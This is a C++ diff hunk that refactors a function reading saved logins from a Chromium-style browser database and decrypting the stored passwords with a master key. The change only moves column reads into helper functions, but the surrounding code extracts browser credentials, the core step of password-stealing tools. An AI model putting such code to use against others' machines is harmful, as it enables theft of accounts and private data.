@@ -35,17 +35,11 @@ std::list<Login> CPasswords::getPasswords(const fs::path &db_path) {
     std::list<Login> passwords;
 
     SQLiteUtil::connectAndRead("SELECT origin_url, username_value, password_value FROM logins ORDER BY times_used DESC", db_path, [this, &passwords](sqlite3_stmt *stmt) {
-        const unsigned char* origin_url = sqlite3_column_text(stmt, 0);
-        const unsigned char* username_value = sqlite3_column_text(stmt, 1);
-        const void* password_value = sqlite3_column_blob(stmt, 2);
-        int password_size = sqlite3_column_bytes(stmt, 2);
-
         Login password_record;
-        password_record.origin = std::string(reinterpret_cast<const char*>(origin_url));
-        password_record.username = std::string(reinterpret_cast<const char*>(username_value));
+        password_record.origin = SQLiteUtil::readString(stmt, 0);
+        password_record.username = SQLiteUtil::readString(stmt, 1);
 
-        std::vector<BYTE> password_encrypted;
-        password_encrypted.assign(static_cast<const BYTE*>(password_value), static_cast<const BYTE*>(password_value) + password_size);
+        std::vector<BYTE> password_encrypted = SQLiteUtil::readBytes(stmt, 2);
 
         std::vector<BYTE> master_key = this->getMasterKey();
         std::string decoded_password = ChromiumUtil::decryptData(password_encrypted, master_key);
